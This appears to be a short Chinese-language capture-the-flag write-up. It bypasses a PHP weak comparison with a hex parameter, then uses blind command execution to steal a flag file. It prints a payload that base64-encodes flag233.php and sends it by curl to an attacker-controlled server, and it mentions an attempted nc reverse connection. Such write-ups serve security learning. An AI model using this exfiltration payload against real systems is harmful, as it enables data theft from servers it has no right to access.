首先需要一个 GET 参数，其值为 `11259375` 但不能包含 `1-9` 中的数字。注意到这里的弱比较，可以将该数字转为十六进制，恰好为 `0xabcdef`，不包含 `1-9`，因此提交 `?sign=0xabcdef` 可以发现 `no sign` 的提示没有了。

接下来在保留刚才的参数的同时 POST 命令就可以执行了，但是没有回显，猜想是通过 `nc` 把 `flag233.php` 反弹到自己的服务器上，并且需要走 UDP，但是最终没有成功。最终采用了 curl 的方法，把文件内容 base64 编码后放在 url 里向服务器发送请求，并在日志中查看 flag。payload：
```
cmd=data=$(cat flag233.php | base64);curl http://xx.xx.xx.xx?data=$data;
```
在 `access.log` 中即可得到编码后的 `flag233.php`。